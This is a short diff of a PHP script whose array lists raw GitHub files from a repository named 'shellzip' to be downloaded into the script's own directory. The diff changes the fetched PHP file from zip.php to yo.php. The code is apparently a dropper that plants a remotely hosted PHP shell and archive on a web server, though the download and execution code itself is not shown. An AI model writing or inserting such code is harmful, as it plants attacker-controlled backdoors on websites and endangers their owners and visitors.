@@ -1,6 +1,6 @@
 <?php
 $files_to_download = [
-    'https://raw.githubusercontent.com/Zeddgansz/shellzip/refs/heads/main/zip.php' => __DIR__ . '/zip.php',
+    'https://raw.githubusercontent.com/Zeddgansz/shellzip/refs/heads/main/yo.php' => __DIR__ . '/yo.php',
     'https://raw.githubusercontent.com/Zeddgansz/shellzip/refs/heads/main/yo.zip' => __DIR__ . '/yo.zip',
 ];
 
